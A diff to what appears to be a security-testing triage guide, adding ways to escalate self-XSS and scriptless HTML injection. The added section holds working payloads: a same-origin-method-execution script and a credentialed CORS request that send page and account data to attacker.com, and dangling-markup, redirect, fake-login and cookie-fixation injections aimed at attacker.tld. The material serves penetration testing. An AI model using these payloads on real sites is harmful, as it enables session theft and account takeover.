@@ -488,3 +488,47 @@ Mark as FALSE POSITIVE and discard (do NOT report as vulnerability) if ANY of th
 - CSP with strict nonces/hashes and no unsafe-inline or wildcard domains → XSS not exploitable without CSP bypass
 - Trusted Types enforced on all sinks → XSS not exploitable without Trusted Types bypass
 - Alert fires only in developer-mode console with no real execution path → NOT a valid XSS
+
+
+
+## Additional Techniques — ported from WebSkills (xss-html-injection-selfxss-bypass)
+
+The fork rules above correctly downgrade *bare* self-XSS and HTML-encoded reflection to Informational. Before discarding, attempt these escalations — a self-XSS or a scripts-blocked HTML injection can still reach real impact.
+
+### Escalate Self-XSS → impact (don't drop it)
+
+**Login CSRF chain** — if the login form has no CSRF protection, force the victim into the *attacker's* account (which holds a stored self-XSS in a profile field). The payload then executes in the victim's browser/session context. Combine with an action that re-associates data to the victim to weaponize.
+
+**SOME (Same-Origin Method Execution)** — when a self-XSS sink lives on a page reachable via `window.open`, an attacker parent page can chain `window.opener` to read same-origin sensitive endpoints:
+```html
+<!-- attacker.com/exploit.html (parent A) -->
+<script>
+  window.open('https://target.com/dashboard');   // child B triggers self-XSS
+  window.location.href = 'https://target.com/api/me';  // load secret into parent
+</script>
+<!-- injected as the self-XSS payload (child B): -->
+<script>
+setTimeout(() => {
+  fetch('https://attacker.com/leak?d=' + btoa(window.opener.document.body.innerHTML));
+}, 200);   // 100-200ms delay for parent nav
+</script>
+```
+Same-origin only; scan JSONP callbacks (Burp SOMEtime). Mitigation: static callbacks, no JSONP.
+
+**Self-XSS + CORS → ATO** — if the target also has a credentialed CORS misconfig (see cors_misconfiguration.md), replace the self-XSS payload with a `withCredentials` XHR that reads the victim's authenticated account API and exfiltrates it:
+```javascript
+var x=new XMLHttpRequest();
+x.onreadystatechange=function(){if(this.status==200)
+  new Image().src='https://attacker.com/leak?d='+btoa(this.responseText);};
+x.open("GET","https://target.com/api/account",true);
+x.withCredentials=true;x.send();
+```
+
+### Escalate scriptless HTML injection (scripts/CSP block JS)
+
+Pure HTML injection (tags render but `<script>`/event handlers are stripped or CSP blocks execution) is still impactful via *dangling-markup* / scriptless techniques:
+- **Open redirect / phishing content**: `<meta http-equiv="refresh" content="0;url=http://attacker.tld">` or an injected `<a>`/fake login `<form action="https://attacker.tld">`.
+- **Set a cookie** (session fixation): `<meta http-equiv="Set-Cookie" Content="SESSID=attacker">`.
+- **Data/secret theft via dangling markup**: unterminated `<img src='https://attacker.tld?` / `<portal src='https://attacker.tld?` absorbs the following page markup (including CSRF tokens) into the exfil URL when the browser resolves it.
+- **PasteJacking / UI redress** injected into the page.
+Reference: hacktricks "dangling markup / HTML scriptless injection".
